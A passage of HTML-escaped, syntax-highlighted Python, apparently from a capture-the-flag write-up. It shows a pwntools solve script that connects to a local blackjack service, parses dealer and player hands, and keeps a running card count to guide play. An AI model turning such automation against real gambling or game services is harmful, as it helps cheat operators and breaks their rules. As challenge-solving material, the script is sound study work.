style=\"--0:#79B8FF\">11\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">value \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">10\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">while\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> value \u003C/span>\u003Cspan style=\"--0:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">21\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">and\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> aces:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">value \u003C/span>\u003Cspan style=\"--0:#F97583\">-=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">10\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">aces \u003C/span>\u003Cspan style=\"--0:#F97583\">-=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">soft \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> aces \u003C/span>\u003Cspan style=\"--0:#F97583\">>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">return\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> value, soft\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">from\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> pwn \u003C/span>\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">BALANCE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">30000\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">sprint \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">lambda\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">*\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">x: \u003C/span>\u003Cspan style=\"--0:#79B8FF\">None\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">def\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0\">update_count\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(card):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">global\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> count\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> card \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'2'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'3'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'4'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'5'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'6'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'7'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'8'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'9'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'10'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'Jack'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'Queen'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'King'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'Ace'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"INVALID CARD\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, card)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF\">exit\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> card \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'2'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'3'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'4'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'5'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'6'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">count \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">elif\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> card \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'10'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'Jack'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'Queen'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'King'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#9ECBFF\">'Ace'\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">count \u003C/span>\u003Cspan style=\"--0:#F97583\">-=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">count \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">cards_seen \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">game_state \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> {}\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">validate_end_turn_computation \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">import\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> time\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#E1E4E8\">p \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> remote(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"127.0.0.1\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">36051\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#F97583\">while\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">    \u003C/span>\u003Cspan style=\"--0:#F97583\">try\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">resp \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> p.recvuntil(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"[BEGIN USER INTERACTION]\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)[:\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#79B8FF\">len\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">b\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"[BEGIN USER INTERACTION]\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)].decode().split(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#79B8FF\">\\n\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">        \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">resp \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [x.strip() \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> resp \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> x]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> resp:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#F97583\">f\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"[RESP] \u003C/span>\u003Cspan style=\"--0:#79B8FF\">{\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">line\u003C/span>\u003Cspan style=\"--0:#79B8FF\">}\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#99A0A6\"># This message gives information about the count\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">        \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> resp[\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">].startswith(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"Player balance\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">):\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#79B8FF\">BALANCE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">float\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(resp[\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">].split(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\" \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)[\u003C/span>\u003Cspan style=\"--0:#F97583\">-\u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">])\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">sprint(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"MY BALANCE: \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">, \u003C/span>\u003Cspan style=\"--0:#79B8FF\">BALANCE\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">            \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">dealer_hand \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [line \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> resp \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line.startswith(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"[Dealer] Dealer's ending hand\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#F97583\">not\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> dealer_hand:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">validate_end_turn_computation \u003C/span>\u003Cspan style=\"--0:#F97583\">-=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> validate_end_turn_computation \u003C/span>\u003Cspan style=\"--0:#F97583\">&#x3C;\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"SOMETHING IS WRONG\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                    \u003C/span>\u003Cspan style=\"--0:#79B8FF\">exit\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">()\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">            \u003C/span>\u003Cspan style=\"--0:#F97583\">else\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">ending_hand_line \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [line \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> resp \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line.startswith(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"[Dealer] Dealer's ending hand\"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)][\u003C/span>\u003Cspan style=\"--0:#79B8FF\">0\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">my_ending_hands \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [line \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> resp[resp.index(ending_hand_line):] \u003C/span>\u003Cspan style=\"--0:#F97583\">if\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> line.startswith(\u003C/span>\u003Cspan style=\"--0:#9ECBFF\">\"(Hand \"\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">)]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">dealer_hand \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> extract_cards_from_string(ending_hand_line)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">my_ending_hands \u003C/span>\u003Cspan style=\"--0:#F97583\">=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> [extract_cards_from_string(hand) \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> hand \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> my_ending_hands]\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(resp)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#79B8FF\">print\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">(my_ending_hands, dealer_hand)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> card \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> dealer_hand:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">update_count(card)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                    \u003C/span>\u003C/span>\u003Cspan style=\"--0:#E1E4E8\">cards_seen \u003C/span>\u003Cspan style=\"--0:#F97583\">+=\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF\">1\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\n\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> hand \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> my_ending_hands:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">                    \u003C/span>\u003Cspan style=\"--0:#F97583\">for\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> card \u003C/span>\u003Cspan style=\"--0:#F97583\">in\u003C/span>\u003Cspan style=\"--0:#E1E4E8\"> hand:\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"code\">\u003Cspan class=\"indent\">\u003Cspan style=\"--0:#E1E4E8\">                        